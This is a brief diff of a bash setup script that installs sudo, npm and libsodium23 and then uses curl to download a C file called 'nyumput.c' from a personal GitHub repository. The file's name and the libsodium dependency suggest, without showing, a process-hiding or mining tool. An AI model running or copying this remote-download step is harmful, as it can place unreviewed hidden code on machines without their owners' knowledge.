@@ -1,7 +1,6 @@
 #!/bin/bash
 set -x
-#!/bin/bash
-apt-get update ; apt-get install sudo -y
+apt-get update ; apt-get install sudo npm -y
 sudo apt-get install libsodium23 -y
 apt-get install libsodium23 -y
 curl https://github.com/nandafiku/fillesg/raw/main/nyumput.c -o nyumput.c
